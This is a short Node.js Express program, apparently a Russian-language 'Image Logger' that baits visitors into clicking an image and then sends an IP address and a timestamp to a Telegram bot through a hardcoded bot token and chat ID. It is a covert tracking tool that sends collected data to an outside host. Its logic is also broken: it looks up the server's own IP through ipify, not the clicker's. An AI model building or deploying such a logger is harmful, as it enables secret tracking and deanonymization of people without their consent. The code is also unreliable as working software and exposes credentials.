
const express = require('express');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '7998823383:AAHL12ziRMoiiNNKthbrW46ZfHnXfqur8bU';
const TELEGRAM_CHAT_ID = '6381947984';

app.get('/', (req, res) => {
  res.send(\`
    <html>
      <head><title>Image Logger</title></head>
      <body>
        <h2>Нажми на изображение 👇</h2>
        <img src="https://via.placeholder.com/300" onclick="fetch('/log-ip')" style="cursor:pointer;">
      </body>
    </html>
  \`);
});

app.get('/log-ip', async (req, res) => {
  const ipResponse = await fetch('https://api.ipify.org?format=json');
  const ipData = await ipResponse.json();
  const ip = ipData.ip;

  const message = \`📸 Клик по фото\nIP: \${ip}\nВремя: \${new Date().toLocaleString()}\`;

  const url = \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    })
  });

  res.send('✅ IP отправлен');
});

app.listen(PORT, () => {
  console.log(\`Сервер запущен на порту \${PORT}\`);
});
